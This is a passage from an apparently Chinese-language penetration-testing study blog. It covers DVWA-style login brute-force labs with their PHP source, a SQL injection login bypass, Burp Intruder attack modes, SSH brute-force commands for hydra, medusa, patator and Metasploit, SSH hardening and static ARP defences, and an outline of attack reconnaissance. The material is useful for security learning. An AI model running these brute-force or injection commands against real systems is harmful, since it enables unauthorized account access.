<span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>代码很简单，用户输入账号密码后，将用户的密码进行MD5加密，从数据库中找相应的账号密码与之对比，相与为1的话输出用户名和头像。</p>
<p>我们随便输入账号密码，用burpsuite拦截数据包。在burpsuite中右键将包发送至intruder模块。进入intruder的positions模块，选择需要爆破的变量，需要爆破的变量前后面都加$，选择攻击类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Sniper – 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</span><br><span class="line"></span><br><span class="line">Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</span><br><span class="line"></span><br><span class="line">Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</span><br><span class="line"></span><br><span class="line">Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</span><br></pre></td></tr></table></figure>
<p>选择cluster bomb，再在payloads模块的payload options添加字典。爆破出结果。</p>
<p>第二种方法是SQL注入，从源码看到没有对username和password进行过滤。当试到6个字段的时候，它说成功进入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,3,4,5,6 -- d</span><br><span class="line"></span><br><span class="line">Welcome to the password protected area &#x27; union select 1,2,3,4,5,6 -- d</span><br></pre></td></tr></table></figure>
<h2 id="8-2-网页密码暴力破解-中"><a href="#8-2-网页密码暴力破解-中" class="headerlink" title="8.2 网页密码暴力破解[中]"></a>8.2 网页密码暴力破解[中]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$qry</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p> mysqli_real_escape_string()会将转义特殊字符，一定程度上防止SQL注入。 所以用[低]的burpsuite方法解决。</p>
<h2 id="8-3-网页密码暴力破解-高"><a href="#8-3-网页密码暴力破解-高" class="headerlink" title="8.3 网页密码暴力破解[高]"></a>8.3 网页密码暴力破解[高]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>还是可以用burpsuite解决，但每次登录失败都要sleep3秒，大大降低破解速度。</p>
<h2 id="8-4-SSH密码暴力破解"><a href="#8-4-SSH密码暴力破解" class="headerlink" title="8.4 SSH密码暴力破解"></a>8.4 SSH密码暴力破解</h2><h3 id="8-4-1-hydra"><a href="#8-4-1-hydra" class="headerlink" title="8.4.1 hydra"></a>8.4.1 hydra</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh -o ssh-hydra.ok</span><br></pre></td></tr></table></figure>
<h3 id="8-4-2-medusa"><a href="#8-4-2-medusa" class="headerlink" title="8.4.2 medusa"></a>8.4.2 medusa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">速度快，支持大规模并行，模块化，爆破登录，可以同时对多个主机、用户或密码执行强力测试。medusa和hydra一样，同样属于在线密码破解工具。不同的是，medusa的稳定性相较于hydra要好很多，但其支持模块要比hydra少一些。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br><span class="line"></span><br><span class="line">medusa -M ssh -H hostlist.txt -U userlist.txt -P passlist.txt -O ssh.log</span><br></pre></td></tr></table></figure>
<h3 id="8-4-3-patator"><a href="#8-4-3-patator" class="headerlink" title="8.4.3 patator"></a>8.4.3 patator</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.137.147 user=root password=FILE0 0=passlist.txt -x ignore:mesg=&#x27;Authentication failed&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="8-4-5-brutespray"><a href="#8-4-5-brutespray" class="headerlink" title="8.4.5 brutespray"></a>8.4.5 brutespray</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brutepray是一款基于nmap扫描输出的gnmap/XML文件，自动调用medusa对服务进行爆破。</span><br></pre></td></tr></table></figure>
<p>kali安装brutespray</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install brutespray</span><br></pre></td></tr></table></figure>
<p>brutespray语法参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-f FILE, --file FILE  GNMAP, JSON or XML file to parse</span><br><span class="line">-o OUTPUT, --output OUTPUT</span><br><span class="line">                      Directory containing successful attempts</span><br><span class="line">-s SERVICE, --service SERVICE</span><br><span class="line">                      specify service to attack</span><br><span class="line">-t THREADS, --threads THREADS</span><br><span class="line">                      number of medusa threads</span><br><span class="line">-T HOSTS, --hosts HOSTS</span><br><span class="line">                      number of hosts to test concurrently</span><br><span class="line">-U USERLIST, --userlist USERLIST</span><br><span class="line">                      reference a custom username file</span><br><span class="line">-P PASSLIST, --passlist PASSLIST</span><br><span class="line">                      reference a custom password file</span><br><span class="line">-u USERNAME, --username USERNAME</span><br><span class="line">                      specify a single username</span><br><span class="line">-p PASSWORD, --password PASSWORD</span><br><span class="line">                      specify a single password</span><br><span class="line">-c, --continuous      keep brute-forcing after success</span><br><span class="line">-i, --interactive     interactive mode</span><br><span class="line">-m, --modules         dump a list of available modules to brute</span><br><span class="line">-q, --quiet           supress banner</span><br></pre></td></tr></table></figure>
<h3 id="8-4-6-msf"><a href="#8-4-6-msf" class="headerlink" title="8.4.6 msf"></a>8.4.6 msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit framework是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的perl编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。</span><br></pre></td></tr></table></figure>
<h4 id="8-4-6-1-SSH模块"><a href="#8-4-6-1-SSH模块" class="headerlink" title="8.4.6.1. SSH模块"></a>8.4.6.1. SSH模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# msfconsole</span><br><span class="line">msf6 &gt; search ssh</span><br></pre></td></tr></table></figure>
<h4 id="8-4-6-2-SSH用户枚举"><a href="#8-4-6-2-SSH用户枚举" class="headerlink" title="8.4.6.2. SSH用户枚举"></a>8.4.6.2. SSH用户枚举</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; set USER_FILE /root/userlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; run</span><br></pre></td></tr></table></figure>
<h4 id="8-4-6-3-SSH版本探测"><a href="#8-4-6-3-SSH版本探测" class="headerlink" title="8.4.6.3. SSH版本探测"></a>8.4.6.3. SSH版本探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br></pre></td></tr></table></figure>
<h4 id="8-4-6-4-SSH暴力破解"><a href="#8-4-6-4-SSH暴力破解" class="headerlink" title="8.4.6.4. SSH暴力破解"></a>8.4.6.4. SSH暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /root/userlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></pre></td></tr></table></figure>
<h3 id="8-4-7-burpsuite"><a href="#8-4-7-burpsuite" class="headerlink" title="8.4.7 burpsuite"></a>8.4.7 burpsuite</h3><p>8.1-8.3用的就是burpsuite暴力破解的例子。</p>
<h2 id="8-5-暴力破解防御"><a href="#8-5-暴力破解防御" class="headerlink" title="8.5 暴力破解防御"></a>8.5 暴力破解防御</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1.sueradd shell[推荐]</span><br><span class="line">useradd v5le0n9 -s /sbin/nologin</span><br><span class="line"></span><br><span class="line">2.密码的复杂性[推荐]</span><br><span class="line">字母大小写+数字+特殊字符+20位以上+定期更换</span><br><span class="line"></span><br><span class="line">3.修改默认端口[推荐]</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">port 22222</span><br><span class="line"></span><br><span class="line">4.限制登录的用户或组[推荐]</span><br><span class="line">#permitrootlogin yes</span><br><span class="line">allowusers v5le0n9</span><br><span class="line"></span><br><span class="line">man sshd_config</span><br><span class="line">allowusers allowgroups denyusers denygroups</span><br><span class="line"></span><br><span class="line">5.使用sudo，不用root用户[推荐]</span><br><span class="line"></span><br><span class="line">6.设置允许的IP访问[可选]</span><br><span class="line">/etc/hosts.alllow，例如sshd:192.168.137.147:allow</span><br><span class="line">PAM基于IP限制</span><br><span class="line">iptables/firewalld</span><br><span class="line">只能允许从堡垒机访问</span><br><span class="line"></span><br><span class="line">7.使用denyhosts自动统计，并将其加入到/etc/hosts.deny</span><br><span class="line"></span><br><span class="line">8.基于PAM实现登录限制[推荐]</span><br><span class="line">模块：pam_tally2.so</span><br><span class="line">功能：登录统计</span><br><span class="line">示例：实现防止对sshd暴力破解</span><br><span class="line">grep tally2 /etc/pam.d/sshd</span><br><span class="line">auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=60 unlock_time=6</span><br><span class="line"></span><br><span class="line">9.禁用密码改用公钥方式认证</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">passwordauthentication no</span><br><span class="line"></span><br><span class="line">10.保护shell导出会话文件[小心]</span><br><span class="line"></span><br><span class="line">11.GRUB加密[针对本地破解]</span><br></pre></td></tr></table></figure>
<h1 id="9-中间人攻击"><a href="#9-中间人攻击" class="headerlink" title="9. 中间人攻击"></a>9. 中间人攻击</h1><p>利用ARP，ARP是地址解析协议，将IP地址转化为MAC地址。</p>
<p>kali抓包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -nn arp	and host 192.168.137.147 抓ARP协议包</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G	图形化</span><br></pre></td></tr></table></figure>
<p>使用静态IP/MAC防止中间人攻击(windows下)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netsh i i show in	查看本地网络IDX值</span><br><span class="line">netsh -c &quot;i i&quot; add ne idx值 192.168.137.147 00-aa-00-62-6-c6-09	永久绑定</span><br><span class="line">arp -a	查看是否绑定成功</span><br><span class="line">netch -c &quot;i i&quot; delete neighbors idx值	删除绑定的IP/MAC</span><br></pre></td></tr></table></figure>
<p>Linux下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -s 192.168.137.147 00-aa-00-62-6-c6-09</span><br></pre></td></tr></table></figure>
<h1 id="10-WEB信息收集"><a href="#10-WEB信息收集" class="headerlink" title="10. WEB信息收集"></a>10. WEB信息收集</h1><h2 id="10-1-网络信息收集的内容"><a href="#10-1-网络信息收集的内容" class="headerlink" title="10.1 网络信息收集的内容"></a>10.1 网络信息收集的内容</h2><h3 id="10-1-1-网络攻击信息收集"><a href="#10-1-1-网络攻击信息收集" class="headerlink" title="10.1.1. 网络攻击信息收集"></a>10.1.1. 网络攻击信息收集</h3><p>入手点：目标的名称和域名</p>
<p>攻击准备阶段：</p>
<ul>
<li>在网络中的“地理位置”</li>
<li>与真实世界的联系(实施社工和物理攻击)</li>
<li>“网络地图”</li>
<li>攻击所需的更详细信息</li>
</ul>
<p>攻击实施阶段：</p>
<ul>
<li>目标系统中存在的安全缺陷和漏洞</li>
<li>目标系统的安全防护机制</li>
</ul>
<h3 id="10-1-2-网络防御信息收集"><a href="#10-1-2-网络防御信息收集" class="headerlink" title="10.1.2. 网络防御信息收集"></a>10.1.2. 网络防御信息收集</h3><p>追查入侵者的身份、网络位置、所攻击的目标、采用的攻击方法等</p>
<p>一般被归入取证与追踪技术范畴</p>
<h2 id="10-2-信息收集的方式"><a href="#10-2-信息收集的方式" class="headerlink" title="10.2 信息收集的方式"></a>10.2 信息收集的方式</h2><ol>
<li>主动信息收集</li>
</ol>
<ul>
<li>通过直接访问、扫描网站，这种流量将流经网站。</li>
<li>能获取更多的信息， 但目标主机可能会记录操作记录。</li>
</ul>
<ol>
<li>被动信息收集</li>
</ol>
<ul>
<li>利用第三方的服务对目标进行访问了解，如搜索引擎等。</li>
<li>收集的信息会相对较少，但是行动并不会被目标主机发现。</li>
</ul>
<h2 id="10-3-信息收集的技术方法"><a href="#10-3-信息收集的技术方法" class="headerlink" title="10.3 信息收集的技术方法"></a>10.3 信息收集的技术方法</h2><script type="math/tex; mode=display">
\begin{cases}踩点\begin{cases}Web搜索与挖掘\\DNS和IP查询\\网络拓扑和侦察\end{cases}\\扫描\begin{cases}主机扫描\\端口扫描\\系统类型探查\\漏洞扫描\end{cases}\\查点\begin{cases}旗标抓取\\网络服务查点\end{cases}\end{cases}</script><h3 id="10-3-1-网络踩点技术"><a href="#10-3-1-网络踩点技术" class="headerlink" title="10.3.1 网络踩点技术"></a>10.3.1 网络踩点技术</h3><h4 id="10-3-1-1-踩点"><a href="#10-3-1-1-踩点" class="headerlink" title="10.3.1.1. 踩点"></a>10.3.1.1. 踩点</h4><ul>
<li>有计划、有步骤的信息情报收集</li>
<li>了解攻击目标的网络环境和信息安全装库啊</li>
<li>得到攻击目标剖析图</li>
</ul>
<h4 id="10-3-1-2-踩点目的"><a href="#10-3-1-2-踩点目的" class="headerlink" title="10.3.1.2. 踩点目的"></a>10.3.1.2. 踩点目的</h4><ul>
<li>通过对完整剖析图的细致分析</li>
<li>攻击者将会从中寻找出攻击目标可能存在的薄弱环节</li>
<li>为进一步的攻击行动提供指引</li>
</ul>
<h4 id="10-3-1-3-踩点针对的信息"><a href="#10-3-1-3-踩点针对的信息" class="headerlink" title="10.3.1.3. 踩点针对的信息"></a>10.3.1.3. 踩点针对的信息</h4><h5 id="10-3-1-3-1-目标组织"><a href="#10-3-1-3-1-目标组织" class="headerlink" title="10.3.1.3.1 目标组织"></a>10.3.1.3.1 目标组织</h5><ul>
<li>具体使用的域名</li>
<li>网络地址范围</li>
<li>因特网上可直接访问的IP地址与网络服务</li>
<li>网络拓扑结构及软硬件</li>
<li>电话号码段</li>
<li>电子邮件列表</li>
<li>信息安全状况</li>
</ul>
<h5 id="10-3-1-3-2-目标个人"><a href="#10-3-1-3-2-目标个人" class="headerlink" title="10.3.1.3.2 目标个人"></a>10.3.1.3.2 目标个人</h5><ul>
<li>身份信息、联系方式、职业经历、甚至一些个人隐私信息</li>
</ul>
<h4 id="10-3-1-4-踩点技术手段"><a href="#10-3-1-4-踩点技术手段" class="headerlink" title="10.3.1.4. 踩点技术手段"></a>10.3.1.4. 踩点技术手段</h4><h5 id="10-3-1-4-1-Web信息搜索与挖掘"><a href="#10-3-1-4-1-Web信息搜索与挖掘" class="headerlink" title="10.3.1.4.1 Web信息搜索与挖掘"></a>10.3.1.4.1 Web信息搜索与挖掘</h5><p>对目标组织或个人的大量公开或意外泄漏的Web信息进行挖掘。</p>
